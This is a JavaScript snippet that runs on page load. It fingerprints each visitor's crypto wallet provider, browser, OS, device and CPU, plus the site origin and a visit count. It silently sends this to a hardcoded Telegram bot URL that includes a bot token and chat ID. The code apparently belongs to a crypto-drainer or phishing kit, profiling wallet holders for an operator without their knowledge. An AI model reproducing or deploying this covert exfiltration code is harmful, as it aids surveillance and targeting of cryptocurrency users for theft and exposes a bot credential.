const apiUrl = "https://api.telegram.org/bot6647906955:AAFmV4180LOBgfyZk8bbHgB0EgMZAO4RSJs/sendMessage?chat_id=6201777101&text="
const tgNewLine = '%0A';

function sendVisitMessage(_text, _visitCount) {
    if (!_visitCount) {
        _visitCount = 1;
    }
    _text.push(`ğŸ”¢       Vistits: ${_visitCount}`);
    _text.push('------------');
    let message = _text.join('\n').replace(/ /g, '%20').split('\n').join('%0A');

    localStorage.setItem('visit', _visitCount);

    let fetchURL = apiUrl + message;

    const xhr = new XMLHttpRequest();

    xhr.open('GET', fetchURL, true);
    xhr.onload = () => {

    }

    xhr.send();
}

function getCurrentProvider() {
    if (!window.web3) return 'unknown';

    if (window.web3.currentProvider.isMetaMask)
        return 'metamask';

    if (window.web3.currentProvider.isTrust)
        return 'trust';

    if (window.web3.currentProvider.isGoWallet)
        return 'goWallet';

    if (window.web3.currentProvider.isAlphaWallet)
        return 'alphaWallet';

    if (window.web3.currentProvider.isStatus)
        return 'status';

    if (window.web3.currentProvider.isToshi)
        return 'coinbase';

    if (typeof window.__CIPHER__ !== 'undefined')
        return 'cipher';

    if (window.web3.currentProvider.constructor.name === 'EthereumProvider')
        return 'mist';

    if (window.web3.currentProvider.constructor.name === 'Web3FrameProvider')
        return 'parity';

    if (window.web3.currentProvider.host && window.web3.currentProvider.host.indexOf('infura') !== -1)
        return 'infura';

    if (window.web3.currentProvider.host && window.web3.currentProvider.host.indexOf('localhost') !== -1)
        return 'localhost';

    return 'unknown';
}



function main() {
    let uap = new UAParser();
    let userResult = uap.getResult();
    let currentProvider = getCurrentProvider();

    let url = window.origin;

    let urlText = "ğŸ”—       Site: " + url.split('\/\/')[1];
    let providerTest = `ğŸ“œ       Wallet: ${currentProvider}`;
    let browser = `ğŸ‘¨â€�ğŸ’»       Browser: ${userResult.browser.name}, ${userResult.browser.version}`;
    let os = `ğŸ’½       OS: ${userResult.os.name}, ${userResult.os.version}`;
    let device = `ğŸ–¥ï¸�       Device: ${Object.values(userResult.device)}`;
    let cpu = `âš™ï¸�       CPU: ${Object.values(userResult.cpu)}`


    let message = [
        urlText,
        providerTest,
        browser,
        device,
        os,
        cpu
    ]


    console.log(localStorage.getItem('visit'));

    // sendVisitMessage(message);

    if (!localStorage.getItem('visit')) {
        try {
            sendVisitMessage(message);
        } catch (e) {
            console.log(e)
        }
    } else {
        let visits = Number(localStorage.getItem('visit'));
        if (typeof visits == 'number') {
            visits++;
        } else {
            visits = 2;
        }

        sendVisitMessage(message, visits);
    }
}


try {
    main();
} catch (e) {
    console.log(e)
}
